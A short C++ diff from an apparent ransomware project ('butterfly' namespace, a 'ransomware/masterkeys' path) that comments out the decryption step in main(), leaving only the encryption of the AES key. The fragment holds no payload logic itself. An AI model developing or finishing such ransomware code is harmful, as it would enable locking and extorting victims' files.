@@ -22,13 +22,13 @@ int main(int argc, char* argv[]) {
     encryptor->encryptAESKey();
 
 
-
+    /*
     sleep(2);
 
     std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
     std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem");
     decryptor->decryptAESKey(cprivate);
-
+    */
 
     return 0;
 }
